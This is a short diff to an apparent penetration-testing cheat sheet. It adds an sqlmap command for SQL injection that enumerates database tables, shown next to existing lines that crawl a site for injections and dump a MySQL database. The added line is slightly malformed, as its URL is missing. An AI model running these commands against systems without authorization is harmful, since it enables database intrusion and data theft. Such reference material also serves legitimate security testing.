@@ -293,6 +293,9 @@ Using jsql
 Crawl a page to find sql-injections
 
     sqlmap -u http://example.com --crawl=1
+Custom SQLi
+    sqlmap -u --data="query" -D [database name] --tables --threads 5 
+    
 Dump database 
 
     sqlmap -u http://172.21.0.0 --dbms=mysql --dump
